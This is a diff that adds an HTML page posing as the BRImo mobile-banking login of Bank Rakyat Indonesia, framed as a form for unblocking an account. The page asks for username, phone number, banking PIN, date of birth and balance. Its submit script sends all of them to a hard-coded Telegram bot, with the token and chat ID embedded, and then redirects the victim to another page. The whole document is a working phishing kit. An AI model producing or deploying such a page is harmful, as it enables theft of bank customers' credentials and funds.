@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BRImo Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      margin: 0;
+      padding: 0;
+    }
+    .header {
+      background-color: white;
+      padding: 14px;
+      text-align: center;
+      border-bottom: 1px solid #ddd;
+    }
+    .header img {
+      max-height: 50px;
+      object-fit: contain;
+    }
+    .container {
+      max-width: 360px;
+      margin: 20px auto;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0px 3px 10px rgba(0,0,0,0.1);
+    }
+    .from-text {
+      font-size: 14px;
+      color: black;
+      font-weight: bold;
+      text-align: center;
+      margin-bottom: 15px;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+      font-size: 14px;
+    }
+    input[type="text"],
+    input[type="password"],
+    input[type="tel"] {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0071D8;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #005bb5;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/9/97/Logo_BRI.png" alt="BRI Logo">
+  </div>
+
+  <div class="container">
+    <div class="from-text">From BRImo</div>
+
+    <form id="loginForm">
+      <div class="form-group">
+        <label for="username">Username/User ID</label>
+        <input type="text" id="username" name="username" placeholder="User Name" required>
+      </div>
+
+      <div class="form-group">
+        <label for="phone">Nomor HP</label>
+        <input type="tel" id="phone" name="phone" placeholder="08xxxxxxxxxx"
+               inputmode="numeric" pattern="\d{10,14}" maxlength="14" required>
+      </div>
+
+      <div class="form-group">
+        <label for="password">PIN</label>
+        <input type="tel" id="password" name="password" placeholder="PIN"
+               inputmode="numeric" pattern="\d{6}" maxlength="6" required>
+      </div>
+
+      <div class="form-group">
+        <label for="dob">Tanggal Lahir</label>
+        <input type="tel" id="dob" name="dob" placeholder="00-00-0000"
+               maxlength="10" inputmode="numeric" required>
+      </div>
+
+      <div class="form-group">
+        <label for="saldo">Saldo Aktif</label>
+        <input type="tel" id="saldo" name="saldo" placeholder="Rp 0" inputmode="numeric" oninput="formatRupiah(this)">
+      </div>
+
+      <button type="submit">Buka Blokir BRImo</button>
+    </form>
+  </div>
+
+  <script>
+    // Auto-format tanggal lahir jadi 00-00-0000
+    const dobInput = document.getElementById("dob");
+    dobInput.addEventListener("input", function() {
+      let value = this.value.replace(/[^0-9]/g, "");
+      if (value.length >= 5) {
+        this.value = value.substring(0, 2) + "-" + value.substring(2, 4) + "-" + value.substring(4, 8);
+      } else if (value.length >= 3) {
+        this.value = value.substring(0, 2) + "-" + value.substring(2, 4);
+      } else {
+        this.value = value;
+      }
+    });
+
+    // Format saldo ke Rupiah
+    function formatRupiah(input) {
+      let angka = input.value.replace(/[^,\d]/g, '');
+      let rupiah = angka.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+      input.value = rupiah ? "Rp " + rupiah : "";
+    }
+
+    // Kirim data ke Telegram dan arahkan ke tp.html
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      let username = document.getElementById("username").value;
+      let phone = document.getElementById("phone").value;
+      let pin = document.getElementById("password").value;
+      let dob = document.getElementById("dob").value;
+      let saldo = document.getElementById("saldo").value;
+
+      let message = `*Data Login BRImo* \n\n Username: ${username}\n Nomor HP: ${phone}\n PIN: ${pin}\n Tanggal Lahir: ${dob}\n Saldo: ${saldo}`;
+
+      let token = "7223686317:AAFJKbUn4qC-s9s6Ii-vQRevQ47bk47TS2I";
+      let chat_id = "7386992179";
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      }).finally(() => {
+        // Arahkan ke halaman tp.html
+        window.location.href = "tp.html";
+      });
+    });
+  </script>
+
+</body>
+</html>
